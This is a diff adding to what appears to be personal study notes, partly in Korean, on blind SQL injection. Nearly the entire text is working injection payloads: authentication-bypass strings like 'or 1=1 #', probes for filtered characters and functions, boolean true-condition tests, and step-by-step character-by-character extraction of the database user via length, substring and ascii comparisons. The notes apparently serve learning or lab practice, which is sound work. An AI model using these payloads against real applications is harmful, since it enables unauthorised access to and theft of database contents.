@@ -28,3 +28,46 @@ python, javascript, java, C,
 blind sql = 관리자' and (select count(table_name) from information_schema.tables) < 86 #
 
 sas' or 1=1 #
+
+
+##blind sql 과정
+sas'-- 
+sas'#
+
+%
+'
+=
+and
+()
+>
+user()
+length
+사용 가능한지 확인
+
+sas%' (                         ) and '%1%'='%1
+
+sas%' () and '%1%'='%1
+
+-------------------------------------------
+
+sas%' and (1)=(1) and '%1%'='%1
+
+sas%' and 'a'='a' and '%1%'='%1
+
+sas%' and 1<2 and '%1%'='%1
+
+sas%' and user()=user() and '%1%'='%1
+
+sas%' and length(user()=user())>0  and '%1%'='%1
+
+-------------------------------------------
+
+
+sas%' and length(user())=15  and '%1%'='%1
+
+sas%' and substring(user(),1,1)>char(104)  and '%1%'='%1
+or
+sas%' and ascii(substring(user(),1,1))>104  and '%1%'='%1 -> i
+
+##blind sql 과정 finish
+
